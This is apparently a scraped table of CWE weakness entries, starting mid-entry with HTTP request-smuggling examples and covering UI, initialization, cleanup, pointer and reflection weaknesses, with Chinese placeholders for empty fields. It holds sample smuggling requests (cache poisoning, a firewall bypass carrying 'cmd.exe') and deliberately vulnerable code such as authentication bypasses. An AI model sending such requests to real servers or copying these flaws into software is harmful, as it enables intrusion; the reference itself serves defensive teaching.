HTTP/1.1Host: www.website.comConnection: Keep-AliveThe original request is forwarded by the proxy server to the web server. Unlike the proxy, the web server uses the first ""Content-Length"" header and considers that the first POST request has no body.(attack code)POST http://www.website.com/foobar.html HTTP/1.1Host: www.website.comConnection: Keep-AliveContent-Type: application/x-www-form-urlencodedContent-Length: 0Content-Length: 54 (ignored by server)Because the web server has assumed the original POST request was length 0, it parses the second request that follows, i.e. for GET /poison.html:(attack code)GET /poison.html HTTP/1.1Host: www.website.comBla: GET http://www.website.com/page_to_poison.html HTTP/1.1Host: www.website.comConnection: Keep-AliveNote that the ""Bla:"" header is treated as a regular header, so it is not parsed as a separate GET request.The requests the web server sees are ""POST /foobar.html"" and ""GET /poison.html"", so it sends back two responses with the contents of the ""foobar.html"" page and the ""poison.html"" page, respectively. The proxy matches these responses to the two requests it thinks were sent by the client - ""POST /foobar.html"" and ""GET /page_to_poison.html"". If the response is cacheable, the proxy caches the contents of ""poison.html"" under the URL ""page_to_poison.html"", and the cache is poisoned! Any client requesting ""page_to_poison.html"" from the proxy would receive the ""poison.html"" page.When a website includes both a proxy server and a web server, some protection against this type of attack can be achieved by installing a web application firewall, or using a web server that includes a stricter HTTP parsing procedure or make all webpages non-cacheable.Additionally, if a web application includes a Java servlet for processing requests, the servlet can check for multiple ""Content-Length"" headers and if they are found the servlet can return an error response thereby preventing the poison page to be cached, as shown below.(good code)Example Language:Javaprotected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {// Set up response writer object...try {// check for multiple content length headersEnumeration contentLengthHeaders = request.getHeaders(""Content-Length"");int count = 0;while (contentLengthHeaders.hasMoreElements()) {count++;}if (count > 1) {// output error response}else {// process request}} catch (Exception ex) {...}}Example 2In the following example, a malformed HTTP request is sent to a website that includes a web server with a firewall with the intent of bypassing the web server firewall to smuggle malicious code into the system.(attack code)POST /page.asp HTTP/1.1Host: www.website.comConnection: Keep-AliveContent-Length: 49223zzz...zzz [""z"" x 49152]POST /page.asp HTTP/1.0Connection: Keep-AliveContent-Length: 30POST /page.asp HTTP/1.0Bla: POST /page.asp?cmd.exe HTTP/1.0Connection: Keep-AliveWhen this request is sent to the web server, the first POST request has a content-length of 49,223 bytes, and the firewall treats the line with 49,152 copies of ""z"" and the lines with an additional lines with 71 bytes as its body (49,152+71=49,223). The firewall then continues to parse what it thinks is the second request starting with the line with the third POST request.Note that there is no CRLF after the ""Bla: "" header so the POST in the line is parsed as the value of the ""Bla:"" header. Although the line contains the pattern identified with a worm (""cmd.exe""), it is not blocked, since it is considered part of a header value. Therefore, ""cmd.exe"" is smuggled through the firewall.When the request is passed through the firewall the web server the first request is ignored because the web server does not find an expected ""Content-Type: application/x-www-form-urlencoded"" header, and starts parsing the second request.This second request has a content-length of 30 bytes, which is exactly the length of the next two lines up to the space after the ""Bla:"" header. And unlike the firewall, the web server processes the final POST as a separate third request and the ""cmd.exe"" worm is smuggled through the firewall to the web server.To avoid this attack a Web server firewall product must be used that is designed to prevent this type of attack.Example 3The interpretation of HTTP responses can be manipulated if response headers include a space between the header name and colon, or if HTTP 1.1 headers are sent through a proxy configured for HTTP 1.0, allowing for HTTP response smuggling. This can be exploited in web browsers and other applications when used in combination with various proxy servers. For instance, the HTTP response interpreted by the front-end/client HTTP agent/entity - in this case the web browser - can interpret a single response from an adversary-compromised web server as being two responses from two different web sites. In the Example below, notice the extra space after the Content-Length and Set-Cookie headers.(attack code)HTTP/1.1 200 OKDate: Fri, 08 Aug 2016 08:12:31 GMTServer: Apache (Unix)Connection: Keep-AliveContent-Encoding: gzipContent-Type: text/htmlContent-Length :2345Transfer-Encoding: chunkedSet-Cookie :token=""Malicious Code""<HTML> ... ""Malicious Code""","Phase:  ImplementationUse a web server that employs a strict HTTP parsing procedure, such as Apache [REF-433].Phase:  ImplementationUse only SSL communication.Phase:  ImplementationTerminate the client session after each request.Phase:  System ConfigurationTurn all pages to non-cacheable."
CWE CATEGORY: DEPRECATED: User Interface Errors,This weakness has been deprecated because it was a duplicate ofCWE-355. All content has been transferred toCWE-355.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-446: UI Discrepancy for Security Feature,"The user interface does not correctly enable or configure a security feature, but the interface provides feedback that causes the user to believe that the feature is in a secure state.","Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ",无示范例子,无可能的缓解方案
CWE-447: Unimplemented or Unsupported Feature in UI,"A UI function for a security feature appears to be supported and gives feedback to the user that suggests that it is supported, but the underlying functionality is not implemented.","Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ",无示范例子,Phase:  TestingPerform functionality testing before deploying the application.
CWE-448: Obsolete Feature in UI,A UI function is obsolete and the product does not warn the user.,"Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by Context, Likelihood: ",无示范例子,Phase:  Architecture and DesignRemove the obsolete feature from the UI. Warn the user that the feature is no longer supported.
CWE-449: The UI Performs the Wrong Action,The UI performs the wrong action with respect to the user's request.,"Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by Context, Likelihood: ",无示范例子,Phase:  TestingPerform extensive functionality testing of the UI. The UI should behave as specified.
CWE-450: Multiple Interpretations of UI Input,The UI has multiple interpretations of user input but does not prompt the user when it selects the less secure interpretation.,"Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-451: User Interface (UI) Misrepresentation of Critical Information,"The user interface (UI) does not properly represent critical information to the user, allowing the information - or its source - to be obscured or spoofed. This is often a component in phishing attacks.","Scope: Non-RepudiationAccess Control, Impact: Technical Impact:Hide Activities; Bypass Protection Mechanism, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationPerform data validation (e.g. syntax, length, etc.) before interpreting the data.Phase:  Architecture and DesignStrategy:  Output EncodingCreate a strategy for presenting information, and plan for how to display unusual characters."
CWE CATEGORY: Initialization and Cleanup Errors,Weaknesses in this category occur in behaviors that are used for initialization and breakdown.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-453: Insecure Default Variable Initialization,"The product, by default, initializes an internal variable with an insecure or less secure value than is possible.","Scope: Integrity, Impact: Technical Impact:Modify Application DataAn attacker could gain access to and modify sensitive data or system information., Likelihood: ","Example 1This code attempts to login a user using credentials from a POST request:(bad code)Example Language:PHP// $user and $pass automatically set from POST requestif (login_user($user,$pass)) {$authorized = true;}...if ($authorized) {generatePage();}Because the $authorized variable is never initialized, PHP will automatically set $authorized to any value included in the POST request if register_globals is enabled. An attacker can send a POST request with an unexpected third value 'authorized' set to 'true' and gain authorized status without supplying valid credentials.Here is a fixed version:(good code)Example Language:PHP$user = $_POST['user'];$pass = $_POST['pass'];$authorized = false;if (login_user($user,$pass)) {$authorized = true;}...This code avoids the issue by initializing the $authorized variable to false and explicitly retrieving the login credentials from the $_POST variable. Regardless, register_globals should never be enabled and is disabled by default in current versions of PHP.","Phase:  System ConfigurationDisable or change default settings when they can be used to abuse the system. Since those default settings are shipped with the product they are likely to be known by a potential attacker who is familiar with the product. For instance, default credentials should be changed or the associated accounts should be disabled."
CWE-454: External Initialization of Trusted Variables or Data Stores,The product initializes critical internal variables or data stores using inputs that can be modified by untrusted actors.,"Scope: Integrity, Impact: Technical Impact:Modify Application DataAn attacker could gain access to and modify sensitive data or system information., Likelihood: ","Example 1In the Java example below, a system property controls the debug level of the application.(bad code)Example Language:Javaint debugLevel = Integer.getInteger(""com.domain.application.debugLevel"").intValue();If an attacker is able to modify the system property, then it may be possible to coax the application into divulging sensitive information by virtue of the fact that additional debug information is printed/exposed as the debug level increases.Example 2This code checks the HTTP POST request for a debug switch, and enables a debug mode if the switch is set.(bad code)Example Language:PHP$debugEnabled = false;if ($_POST[""debug""] == ""true""){$debugEnabled = true;}/.../function login($username, $password){if($debugEnabled){echo 'Debug Activated';phpinfo();$isAdmin = True;return True;}}Any user can activate the debug mode, gaining administrator privileges. An attacker may also use the information printed by the phpinfo() function to further exploit the system. .This example also exhibits Information Exposure Through Debug Information (CWE-215)","Phase:  ImplementationStrategy:  Input ValidationA product system should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking (e.g. input validation) is performed when relying on input from outside a trust boundary.Phase:  Architecture and DesignAvoid any external control of variables. If necessary, restrict the variables that can be modified using an allowlist, and use a different namespace or naming convention if possible."
CWE-455: Non-exit on Failed Initialization,"The product does not exit or otherwise modify its operation when security-relevant errors occur during initialization, such as when a configuration file has a format error or a hardware security module (HSM) cannot be activated, which can cause the product to execute in a less secure fashion than intended by the administrator.","Scope: IntegrityOther, Impact: Technical Impact:Modify Application Data; Alter Execution LogicThe application could be placed in an insecure state that may allow an attacker to modify sensitive data or allow unintended logic to be executed., Likelihood: ","Example 1The following code intends to limit certain operations to the administrator only.(bad code)Example Language:Perl$username = GetCurrentUser();$state = GetStateData($username);if (defined($state)) {$uid = ExtractUserID($state);}# do stuffif ($uid == 0) {DoAdminThings();}If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to ""0"" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident.",Phase:  ImplementationFollow the principle of failing securely when an error occurs. The system should enter a state where it is not vulnerable and will not display sensitive error messages to a potential attacker.
CWE-456: Missing Initialization of a Variable,"The product does not initialize critical variables, which causes the execution environment to use unexpected values.","Scope: IntegrityOther, Impact: Technical Impact:Unexpected State; Quality Degradation; Varies by ContextThe uninitialized data may be invalid, causing logic errors within the program. In some cases, this could result in a security problem., Likelihood: ","Example 1This function attempts to extract a pair of numbers from a user-supplied string.(bad code)Example Language:Cvoid parse_data(char *untrusted_input){int m, n, error;error = sscanf(untrusted_input, ""%d:%d"", &m, &n);if ( EOF == error ){die(""Did not specify integer value. Die evil hacker!\n"");}/* proceed assuming n and m are initialized correctly */}This code attempts to extract two integer values out of a formatted, user-supplied input. However, if an attacker were to provide an input of the form:(attack code)123:then only the m variable will be initialized. Subsequent use of n may result in the use of an uninitialized variable (CWE-457).Example 2Here, an uninitialized field in a Java class is used in a seldom-called method, which would cause a NullPointerException to be thrown.(bad code)Example Language:Javaprivate User user;public void someMethod() {// Do something interesting....// Throws NPE if user hasn't been properly initialized.String username = user.getName();}Example 3This code first authenticates a user, then allows a delete command if the user is an administrator.(bad code)Example Language:PHPif (authenticate($username,$password) && setAdmin($username)){$isAdmin = true;}/.../if ($isAdmin){deleteUser($userToDelete);}The $isAdmin variable is set to true if the user is an admin, but is uninitialized otherwise. If PHP's register_globals feature is enabled, an attacker can set uninitialized variables like $isAdmin to arbitrary values, in this case gaining administrator privileges by setting $isAdmin to true.Example 4In the following Java code the BankManager class uses the user variable of the class User to allow authorized users to perform bank manager tasks. The user variable is initialized within the method setUser that retrieves the User from the User database. The user is then authenticated as unauthorized user through the method authenticateUser.(bad code)Example Language:Javapublic class BankManager {// user allowed to perform bank manager tasksprivate User user = null;private boolean isUserAuthentic = false;// constructor for BankManager classpublic BankManager() {...}// retrieve user from database of userspublic User getUserFromUserDatabase(String username){...}// set user variable using usernamepublic void setUser(String username) {this.user = getUserFromUserDatabase(username);}// authenticate userpublic boolean authenticateUser(String username, String password) {if (username.equals(user.getUsername()) && password.equals(user.getPassword())) {isUserAuthentic = true;}return isUserAuthentic;}// methods for performing bank manager tasks...}However, if the method setUser is not called before authenticateUser then the user variable will not have been initialized and will result in a NullPointerException. The code should verify that the user variable has been initialized before it is used, as in the following code.(good code)Example Language:Javapublic class BankManager {// user allowed to perform bank manager tasksprivate User user = null;private boolean isUserAuthentic = false;// constructor for BankManager classpublic BankManager(String username) {user = getUserFromUserDatabase(username);}// retrieve user from database of userspublic User getUserFromUserDatabase(String username) {...}// authenticate userpublic boolean authenticateUser(String username, String password) {if (user == null) {System.out.println(""Cannot find user "" + username);}else {if (password.equals(user.getPassword())) {isUserAuthentic = true;}}return isUserAuthentic;}// methods for performing bank manager tasks...}Example 5This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized (CWE-456). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address.(bad code)Example Language:Cchar *test_string;if (i != err_val){test_string = ""Hello World!"";}printf(""%s"", test_string);When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings (CWE-457).To fix this code, there are a couple approaches to
			  making sure that test_string has been properly set once
			  it reaches the printf().One solution would be to set test_string to an
			  acceptable default before the conditional:(good code)Example Language:Cchar *test_string = ""Done at the beginning"";if (i != err_val){test_string = ""Hello World!"";}printf(""%s"", test_string);Another solution is to ensure that each
			  branch of the conditional - including the default/else
			  branch - could ensure that test_string is set:(good code)Example Language:Cchar *test_string;if (i != err_val){test_string = ""Hello World!"";}else {test_string = ""Done on the other side!"";}printf(""%s"", test_string);",Phase:  ImplementationCheck that critical variables are initialized.Phase:  TestingUse a static analysis tool to spot non-initialized variables.
CWE-457: Use of Uninitialized Variable,"The code uses a variable that has not been initialized, leading to unpredictable or unintended results.","Scope: AvailabilityIntegrityOther, Impact: Technical Impact:OtherInitial variables usually contain junk, which can not be trusted for consistency. This can lead to denial of service conditions, or modify control flow in unexpected ways. In some cases, an attacker can ""pre-initialize"" the variable using previous actions, which might enable code execution. This can cause a race condition if a lock variable check passes when it should not., Likelihood: ; Scope: AuthorizationOther, Impact: Technical Impact:OtherStrings that are not initialized are especially dangerous, since many functions expect a null at the end -- and only at the end -- of a string., Likelihood: ","Example 1This code prints a greeting using information stored in a POST request:(bad code)Example Language:PHPif (isset($_POST['names'])) {$nameArray = $_POST['names'];}echo ""Hello "" . $nameArray['first'];This code checks if the POST array 'names' is set before assigning it to the $nameArray variable. However, if the array is not in the POST request, $nameArray will remain uninitialized. This will cause an error when the array is accessed to print the greeting message, which could lead to further exploit.Example 2The following switch statement is intended to set the values of the variables aN and bN before they are used:(bad code)Example Language:Cint aN, Bn;switch (ctl) {case -1:aN = 0;bN = 0;break;case 0:aN = i;bN = -i;break;case 1:aN = i + NEXT_SZ;bN = i - NEXT_SZ;break;default:aN = -1;aN = -1;break;}repaint(aN, bN);In the default case of the switch statement, the programmer has accidentally set the value of aN twice. As a result, bN will have an undefined value. Most uninitialized variable issues result in general software reliability problems, but if attackers can intentionally trigger the use of an uninitialized variable, they might be able to launch a denial of service attack by crashing the program. Under the right circumstances, an attacker may be able to control the value of an uninitialized variable by affecting the values on the stack prior to the invocation of the function.Example 3This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized (CWE-456). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address.(bad code)Example Language:Cchar *test_string;if (i != err_val){test_string = ""Hello World!"";}printf(""%s"", test_string);When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings (CWE-457).To fix this code, there are a couple approaches to
			  making sure that test_string has been properly set once
			  it reaches the printf().One solution would be to set test_string to an
			  acceptable default before the conditional:(good code)Example Language:Cchar *test_string = ""Done at the beginning"";if (i != err_val){test_string = ""Hello World!"";}printf(""%s"", test_string);Another solution is to ensure that each
			  branch of the conditional - including the default/else
			  branch - could ensure that test_string is set:(good code)Example Language:Cchar *test_string;if (i != err_val){test_string = ""Hello World!"";}else {test_string = ""Done on the other side!"";}printf(""%s"", test_string);","Phase:  ImplementationStrategy:  Attack Surface ReductionAssign all variables to an initial value.Phase:  Build and CompilationStrategy:  Compilation or Build HardeningMost compilers will complain about the use of uninitialized variables if warnings are turned on.Phases:  Implementation; OperationWhen using a language that does not require explicit declaration of variables, run or compile the software in a mode that reports undeclared or unknown variables. This may indicate the presence of a typographic error in the variable's name.Phase:  RequirementsThe choice could be made to use a language that is not susceptible to these issues.Phase:  Architecture and DesignMitigating technologies such as safe string libraries and container abstractions could be introduced."
CWE-458: DEPRECATED: Incorrect Initialization,"This weakness has been deprecated because its name and description did not match. The description duplicatedCWE-454, while the name suggested a more abstract initialization problem. Please refer toCWE-665for the more abstract problem.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-459: Incomplete Cleanup,"The product does not properly ""clean up"" and remove temporary or supporting resources after they have been used.","Scope: OtherConfidentialityIntegrity, Impact: Technical Impact:Other; Read Application Data; Modify Application Data; DoS: Resource Consumption (Other)It is possible to overflow the number of temporary files because directories typically have limits on the number of files allowed. This could create a denial of service problem., Likelihood: ","Example 1Stream resources in a Java application should be released in a finally block, otherwise an exception thrown before the call to close() would result in an unreleased I/O resource. In the example below, the close() method is called in the try block (incorrect).(bad code)Example Language:Javatry {InputStream is = new FileInputStream(path);byte b[] = new byte[is.available()];is.read(b);is.close();} catch (Throwable t) {log.error(""Something bad happened: "" + t.getMessage());}",Phases:  Architecture and Design; ImplementationTemporary files and other supporting resources should be deleted/released immediately after they are no longer needed.
CWE-460: Improper Cleanup on Thrown Exception,"The product does not clean up its state or incorrectly cleans up its state when an exception is thrown, leading to unexpected state or control flow.","Scope: Other, Impact: Technical Impact:Varies by ContextThe code could be left in a bad state., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:Javapublic class foo {public static final void main( String args[] ) {boolean returnValue;returnValue=doStuff();}public static final boolean doStuff( ) {boolean threadLock;boolean truthvalue=true;try {while(//check some condition) {threadLock=true; //do some stuff to truthvaluethreadLock=false;}}catch (Exception e){System.err.println(""You did something bad"");if (something) return truthvalue;}return truthvalue;}}In this case, a thread might be left locked accidentally.","Phase:  ImplementationIf one breaks from a loop or function by throwing an exception, make sure that cleanup happens or that you should exit the program. Use throwing exceptions sparsely."
CWE CATEGORY: DEPRECATED: Data Structure Issues,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-462: Duplicate Key in Associative List (Alist),Duplicate keys in associative lists can lead to non-unique keys being mistaken for an error.,"Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by Context, Likelihood: ","Example 1The following code adds data to a list and then attempts to sort the data.(bad code)Example Language:Pythonalist = []while (foo()): #now assume there is a string data with a key basenamequeue.append(basename,data)queue.sort()Since basename is not necessarily unique, this may not sort how one would like it to be.",Phase:  Architecture and DesignUse a hash table instead of an alist.Phase:  Architecture and DesignUse an alist which checks the uniqueness of hash keys with each entry before inserting the entry.
CWE-463: Deletion of Data Structure Sentinel,The accidental deletion of a data-structure sentinel can cause serious programming logic problems.,"Scope: AvailabilityOther, Impact: Technical Impact:OtherGenerally this error will cause the data structure to not work properly., Likelihood: ; Scope: AuthorizationOther, Impact: Technical Impact:OtherIf a control character, such as NULL is removed, one may cause resource access control problems., Likelihood: ","Example 1This example creates a null terminated string and prints it contents.(bad code)Example Language:Cchar *foo;int counter;foo=calloc(sizeof(char)*10);for (counter=0;counter!=10;counter++) {foo[counter]='a';printf(""%s\n"",foo);}The string foo has space for 9 characters and a null terminator, but 10 characters are written to it. As a result, the string foo is not null terminated and calling printf() on it will have unpredictable and possibly dangerous results.","Phase:  Architecture and DesignUse an abstraction library to abstract away risky APIs. Not a complete solution.Phase:  Build and CompilationStrategy:  Compilation or Build HardeningRun or compile the software using features or extensions that automatically provide a protection mechanism that mitigates or eliminates buffer overflows.For example, certain compilers and extensions provide automatic buffer overflow detection mechanisms that are built into the compiled code. Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.Effectiveness: Defense in DepthNote:This is not necessarily a complete solution, since these mechanisms can only detect certain types of overflows. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.Phase:  OperationUse OS-level preventative functionality. Not a complete solution."
CWE-464: Addition of Data Structure Sentinel,The accidental addition of a data-structure sentinel can cause serious programming logic problems.,"Scope: Integrity, Impact: Technical Impact:Modify Application DataGenerally this error will cause the data structure to not work properly by truncating the data., Likelihood: ","Example 1The following example assigns some character values to a list of characters and prints them each individually, and then as a string. The third character value is intended to be an integer taken from user input and converted to an int.(bad code)Example Language:Cchar *foo;foo=malloc(sizeof(char)*5);foo[0]='a';foo[1]='a';foo[2]=atoi(getc(stdin));foo[3]='c';foo[4]='\0'printf(""%c %c %c %c %c \n"",foo[0],foo[1],foo[2],foo[3],foo[4]);printf(""%s\n"",foo);The first print statement will print each character separated by a space. However, if a non-integer is read from stdin by getc, then atoi will not make a conversion and return 0. When foo is printed as a string, the 0 at character foo[2] will act as a NULL terminator and foo[3] will never be printed.","Phases:  Implementation; Architecture and DesignEncapsulate the user from interacting with data sentinels. Validate user input to verify that sentinels are not present.Phase:  ImplementationProper error checking can reduce the risk of inadvertently introducing sentinel values into data. For example, if a parsing function fails or encounters an error, it might return a value that is the same as the sentinel.Phase:  Architecture and DesignUse an abstraction library to abstract away risky APIs. This is not a complete solution.Phase:  OperationUse OS-level preventative functionality. This is not a complete solution."
CWE CATEGORY: Pointer Issues,Weaknesses in this category are related to improper handling of pointers.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-466: Return of Pointer Value Outside of Expected Range,A function can return a pointer to memory that is outside of the buffer that the pointer is expected to reference.,"Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Memory; Modify Memory, Likelihood: ",无示范例子,无可能的缓解方案
CWE-467: Use of sizeof() on a Pointer Type,"The code calls sizeof() on a malloced pointer type, which always returns the wordsize/8. This can produce an unexpected result if the programmer intended to determine how much memory has been allocated.","Scope: IntegrityConfidentiality, Impact: Technical Impact:Modify Memory; Read MemoryThis error can often cause one to allocate a buffer that is much smaller than what is needed, leading to resultant weaknesses such as buffer overflows., Likelihood: ","Example 1Care should be taken to ensure sizeof returns the size of the data structure itself, and not the size of the pointer to the data structure.In this example, sizeof(foo) returns the size of the pointer.(bad code)Example Language:Cdouble *foo;...foo = (double *)malloc(sizeof(foo));In this example, sizeof(*foo) returns the size of the data structure and not the size of the pointer.(good code)Example Language:Cdouble *foo;...foo = (double *)malloc(sizeof(*foo));Example 2This example defines a fixed username and password. The AuthenticateUser() function is intended to accept a username and a password from an untrusted user, and check to ensure that it matches the username and password. If the username and password match, AuthenticateUser() is intended to indicate that authentication succeeded.(bad code)/* IgnoreCWE-259(hard-coded password) andCWE-309(use of password system for authentication) for this example. */char *username = ""admin"";char *pass = ""password"";int AuthenticateUser(char *inUser, char *inPass) {printf(""Sizeof username = %d\n"", sizeof(username));printf(""Sizeof pass = %d\n"", sizeof(pass));if (strncmp(username, inUser, sizeof(username))) {printf(""Auth failure of username using sizeof\n"");return(AUTH_FAIL);}/* Because ofCWE-467, the sizeof returns 4 on many platforms and architectures. */if (! strncmp(pass, inPass, sizeof(pass))) {printf(""Auth success of password using sizeof\n"");return(AUTH_SUCCESS);}else {printf(""Auth fail of password using sizeof\n"");return(AUTH_FAIL);}}int main (int argc, char **argv){int authResult;if (argc < 3) {ExitError(""Usage: Provide a username and password"");}authResult = AuthenticateUser(argv[1], argv[2]);if (authResult != AUTH_SUCCESS) {ExitError(""Authentication failed"");}else {DoAuthenticatedTask(argv[1]);}}In AuthenticateUser(), because sizeof() is applied to a parameter with an array type, the sizeof() call might return 4 on many modern architectures. As a result, the strncmp() call only checks the first four characters of the input password, resulting in a partial comparison (CWE-187), leading to improper authentication (CWE-287).Because of the partial comparison, any of these passwords would still cause authentication to succeed for the ""admin"" user:(attack code)pass5passABCDEFGHpassWORDBecause only 4 characters are checked, this significantly reduces the search space for an attacker, making brute force attacks more feasible.The same problem also applies to the username, so values such as ""adminXYZ"" and ""administrator"" will succeed for the username.","Phase:  ImplementationUse expressions such as ""sizeof(*pointer)"" instead of ""sizeof(pointer)"", unless you intend to run sizeof() on a pointer type to gain some platform independence or if you are allocating a variable on the stack."
CWE-468: Incorrect Pointer Scaling,"In C and C++, one may often accidentally refer to the wrong memory due to the semantics of when math operations are implicitly scaled.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Memory; Modify MemoryIncorrect pointer scaling will often result in buffer overflow conditions. Confidentiality can be compromised if the weakness is in the context of a buffer over-read or under-read., Likelihood: ","Example 1This example attempts to calculate the position of the second byte of a pointer.(bad code)Example Language:Cint *p = x;char * second_char = (char *)(p + 1);In this example, second_char is intended to point to the second byte of p. But, adding 1 to p actually adds sizeof(int) to p, giving a result that is incorrect (3 bytes off on 32-bit platforms). If the resulting memory address is read, this could potentially be an information leak. If it is a write, it could be a security-critical write to unauthorized memory-- whether or not it is a buffer overflow. Note that the above code may also be wrong in other ways, particularly in a little endian environment.",Phase:  Architecture and DesignUse a platform with high-level memory abstractions.Phase:  ImplementationAlways use array indexing instead of direct pointer manipulation.Phase:  Architecture and DesignUse technologies for preventing buffer overflows.
CWE-469: Use of Pointer Subtraction to Determine Size,"The product subtracts one pointer from another in order to determine size, but this calculation can be incorrect if the pointers do not exist in the same memory chunk.","Scope: Access ControlIntegrityConfidentialityAvailability, Impact: Technical Impact:Modify Memory; Read Memory; Execute Unauthorized Code or Commands; Gain Privileges or Assume IdentityThere is the potential for arbitrary code execution with privileges of the vulnerable program., Likelihood: ","Example 1The following example contains the method size that is used to determine the number of nodes in a linked list. The method is passed a pointer to the head of the linked list.(bad code)Example Language:Cstruct node {int data;struct node* next;};// Returns the number of nodes in a linked list from// the given pointer to the head of the list.int size(struct node* head) {struct node* current = head;struct node* tail;while (current != NULL) {tail = current;current = current->next;}return tail - head;}// other methods for manipulating the list...However, the method creates a pointer that points to the end of the list and uses pointer subtraction to determine the number of nodes in the list by subtracting the tail pointer from the head pointer. There no guarantee that the pointers exist in the same memory area, therefore using pointer subtraction in this way could return incorrect results and allow other unintended behavior. In this example a counter should be used to determine the number of nodes in the list, as shown in the following code.(good code)Example Language:C...int size(struct node* head) {struct node* current = head;int count = 0;while (current != NULL) {count++;current = current->next;}return count;}","Phase:  ImplementationSave an index variable. This is the recommended solution. Rather than subtract pointers from one another, use an index variable of the same size as the pointers in question. Use this variable to ""walk"" from one pointer to the other and calculate the difference. Always validate this number."
CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection'),"The product uses external input with reflection to select which classes or code to use, but it does not sufficiently prevent the input from selecting improper classes or code.","Scope: IntegrityConfidentialityAvailabilityOther, Impact: Technical Impact:Execute Unauthorized Code or Commands; Alter Execution LogicThe attacker might be able to execute code that is not directly accessible to the attacker. Alternately, the attacker could call unexpected code in the wrong place or the wrong time, possibly modifying critical system state., Likelihood: ; Scope: AvailabilityOther, Impact: Technical Impact:DoS: Crash, Exit, or Restart; OtherThe attacker might be able to use reflection to call the wrong code, possibly with unexpected arguments that violate the API (CWE-227). This could cause the product to exit or hang., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataBy causing the wrong code to be invoked, the attacker might be able to trigger a runtime error that leaks sensitive information in the error message, such asCWE-536., Likelihood:","Example 1A common reason that programmers use the reflection API is to implement their own command dispatcher. The following example shows a command dispatcher that does not use reflection:(good code)Example Language:JavaString ctl = request.getParameter(""ctl"");Worker ao = null;if (ctl.equals(""Add"")) {ao = new AddCommand();}else if (ctl.equals(""Modify"")) {ao = new ModifyCommand();}else {throw new UnknownActionError();}ao.doAction(request);A programmer might refactor this code to use reflection as follows:(bad code)Example Language:JavaString ctl = request.getParameter(""ctl"");Class cmdClass = Class.forName(ctl + ""Command"");Worker ao = (Worker) cmdClass.newInstance();ao.doAction(request);The refactoring initially appears to offer a number of advantages. There are fewer lines of code, the if/else blocks have been entirely eliminated, and it is now possible to add new command types without modifying the command dispatcher. However, the refactoring allows an attacker to instantiate any object that implements the Worker interface. If the command dispatcher is still responsible for access control, then whenever programmers create a new class that implements the Worker interface, they must remember to modify the dispatcher's access control code. If they do not modify the access control code, then some Worker classes will not have any access control.One way to address this access control problem is to make the Worker object responsible for performing the access control check. An example of the re-refactored code follows:(bad code)Example Language:JavaString ctl = request.getParameter(""ctl"");Class cmdClass = Class.forName(ctl + ""Command"");Worker ao = (Worker) cmdClass.newInstance();ao.checkAccessControl(request);ao.doAction(request);Although this is an improvement, it encourages a decentralized approach to access control, which makes it easier for programmers to make access control mistakes. This code also highlights another security problem with using reflection to build a command dispatcher. An attacker can invoke the default constructor for any kind of object. In fact, the attacker is not even constrained to objects that implement the Worker interface; the default constructor for any object in the system can be invoked. If the object does not implement the Worker interface, a ClassCastException will be thrown before the assignment to ao, but if the constructor performs operations that work in the attacker's favor, the damage will already have been done. Although this scenario is relatively benign in simple products, in larger products where complexity grows exponentially it is not unreasonable that an attacker could find a constructor to leverage as part of an attack.",Phase:  Architecture and DesignRefactor your code to avoid using reflection.Phase:  Architecture and DesignDo not use user-controlled inputs to select and load classes or code.Phase:  ImplementationApply strict input validation by using allowlists or indirect selection to ensure that the user is only selecting allowable classes or code.
